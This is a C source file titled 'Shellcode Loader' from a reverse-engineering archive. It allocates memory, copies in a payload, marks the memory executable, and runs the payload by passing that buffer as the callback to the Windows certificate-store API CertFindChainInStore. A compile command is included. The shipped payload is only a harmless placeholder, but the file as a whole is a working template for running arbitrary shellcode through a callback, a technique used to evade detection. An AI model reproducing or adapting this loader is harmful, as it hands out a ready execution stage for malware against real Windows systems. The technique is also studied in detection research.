/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  
*/

#include <windows.h>
#include <stdint.h>
#include <wincrypt.h>

#pragma comment(lib,"crypt32")


int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    PCCERT_CHAIN_CONTEXT                chain_ctx = NULL;
    PCCERT_CONTEXT                      cert_ctx  = NULL;
    CERT_CHAIN_FIND_BY_ISSUER_PARA      param;
    SECURITY_STATUS                     status;

    HCERTSTORE          store;

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        ZeroMemory (&param, sizeof(param));
        param.cbSize            = sizeof(param);
        param.pszUsageIdentifier= szOID_PKIX_KP_CLIENT_AUTH;
        param.pfnFindCallback   = (PFN_CERT_CHAIN_FIND_BY_ISSUER_CALLBACK)runtime;

        store = CertOpenSystemStore (0, "MY");

        //--- alternative opening store ---
        // store = CertOpenStore (
        //     CERT_STORE_PROV_SYSTEM_REGISTRY_A, 
        //     X509_ASN_ENCODING|PKCS_7_ASN_ENCODING, 
        //     0, 
        //     CERT_SYSTEM_STORE_CURRENT_USER | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, 
        //     "MY");
        
        CertFindChainInStore (store, X509_ASN_ENCODING, 0, CERT_CHAIN_FIND_BY_ISSUER, &param, chain_ctx);

        // close the handle to store
        CertCloseStore (store, 0);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}